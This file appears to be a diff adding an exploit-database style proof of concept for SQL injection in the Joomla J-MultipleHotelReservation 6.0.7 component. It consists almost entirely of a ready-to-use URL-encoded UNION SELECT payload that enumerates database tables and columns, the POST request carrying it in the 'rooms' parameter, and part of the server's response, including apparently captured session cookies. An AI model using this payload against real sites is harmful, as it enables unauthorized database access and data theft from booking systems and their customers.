@@ -1,0 +1,43 @@
+# Exploit Title: Joomla! Component J-MultipleHotelReservation 6.0.7 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://cmsjunkie.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/vertical-markets/booking-a-reservations/jmultiplehotelreservation/
+# Version: 6.0.7
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/j-myhotel/search-hotels?view=hotels
+# 
+
+%31%2d%31%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%28%73%65%6c%45%43%74%28%40%78%29%66%52%4f%6d%28%73%65%6c%45%43%74%28%40%78%3a%3d%30%78%30%30%29%2c%28%40%72%55%4e%4e%69%6e%67%5f%6e%75%4d%42%65%72%3a%3d%30%29,%28%40%74%62%6c%3a%3d%30%78%30%30%29%2c%28%73%65%6c%45%43%74%28%30%29%66%52%4f%6d%28%69%6e%66%6f%52%4d%41%54%69%6f%6e%5f%73%63%68%45%4d%61%2e%63%6f%4c%55%4d%6e%73%29%77%48%45%72%65%28%74%41%42%4c%65%5f%73%63%68%45%4d%61%3d%64%61%54%41%42%61%73%65%28%29%29%61%4e%64%28%30%78%30%30%29%69%6e%28%40%78%3a%3d%43%6f%6e%63%61%74%28%40%78%2c%69%66%28%28%40%74%62%6c%21%3d%74%41%42%4c%65%5f%6e%61%6d%65%29%2c%43%6f%6e%63%61%74%28%4c%50%41%44%28%40%72%55%4e%4e%69%6e%67%5f%6e%75%4d%42%65%72%3a=%40%72%55%4e%4e%69%6e%67%5f%6e%75%4d%42%65%72%20%31%2c%32%2c%30%78%33%30%29%2c%30%78%33%30%33%64%33%65%2c%40%74%42%6c%3a%3d%74%41%42%4c%65%5f%6e%61%4d%65%2c%28%40%7a%3a%3d%30%78%30%30%29%29%2c%20%30%78%30%30%29%2c%6c%70%61%64%28%40%7a%3a%3d%40%7a%20%31%2c%32%2c%30%78%33%30%29%2c%30%78%33%64%33%65%2c%30%78%34%62%36%66%36%63%36%66%36%65%33%61%32%30%2c%63%6f%6c%75%6d%6e%5f%6e%61%6d%65%2c%30%78%33%63%36%32%37%32%33%65%29%29%29%29%78%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2c%32%33%2c%32%34%2c%32%35%2c%32%36%2c%32%37%2c%32%38%2c%32%39%2c%33%30%2c%33%31%2c%33%32%2c%33%33%2c%33%34%2c%33%35%2c%33%36%2c%33%37%2c%33%38%2c%33%39%2c%34%30%2c%34%31%2c%34%32%2c%34%33%2c%34%34%2d%2d%20%2d
+
+POST /[PATH]/j-myhotel/search-hotels?view=hotels HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 985
+Cookie: __cfduid=d35dbe4de0d461bf69a9165df0f9691951548240991; PHPSESSID=6c6c795380ae5a25888e1dd57e04320a; c9ffd68b334eb414c880fa254194ecbb=6053bfbb8394c9545ab2169c4399aefc
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+controller=search&task=searchHotels&year_start=2019&month_start=01&day_start=23&year_end=2019&month_end=01&hotel_id=&day_end=24&rooms=-1 UNION SELECT 1,(selECt(@x)fROm(selECt(@x: =0x00)%2c(@rUNNing_nuMBer
+HTTP/1.1 200 OK
+Date: Wed, 23 Jan 2019 15:14:32 GMT
+Content-Type: text/html; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Expires: Wed, 17 Aug 2005 00:00:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Last-Modified: Wed, 23 Jan 2019 15:14:32 GMT
+Alt-Svc: h2=":443"; ma=60
+Server: cloudflare
+CF-RAY: 49d9d658025e22c4-LAX
